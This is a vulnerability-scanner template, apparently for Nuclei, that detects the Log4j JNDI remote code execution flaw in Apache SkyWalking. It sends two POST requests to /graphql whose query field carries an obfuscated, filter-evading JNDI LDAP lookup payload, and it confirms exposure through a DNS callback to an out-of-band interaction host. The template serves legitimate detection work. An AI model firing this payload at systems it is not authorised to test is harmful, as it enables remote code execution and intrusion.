id: log4j-apache-skywalking

info:
  name: Apache Skywalking - Log4J RCE
  author: aravazhimdr
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://github.com/cckuailong/reapoc/tree/main/Topic/Log4j/App/Apache-SkyWalking
  tags: rce,jndi,oast,log4j,skywalking

#add CVE-2021-45046
requests:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Referer: {{RootURL}}/
        Accept-Language: en
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
        Content-Type: application/json

        {"query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total logs { serviceId ${${::,:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:):-d}${:Chrome:-a}${:Mozilla:-p}:${:(:-/}/{{Host}}.{{interactsh-url}}} serviceName isError content }}}", "variables":{ "condition":{ "metricName":"testing", "state":"ALL", "paging":{ "pageSize":10 }}}}
        
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Referer: {{RootURL}}/
        Accept-Language: en
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
        Content-Type: application/json

        {"query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total logs { serviceId ${${::,:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:):-d}${:Chrome:-a}${:Mozilla:-p}:${:(:-/}/127.0.0.1#{{Host}}.{{interactsh-url}}} serviceName isError content }}}", "variables":{ "condition":{ "metricName":"testing", "state":"ALL", "paging":{ "pageSize":10 }}}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([A-Za-z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z]{2,4})' 

    extractors:
      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([A-Za-z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z]{2,4})'   # extract Hostname
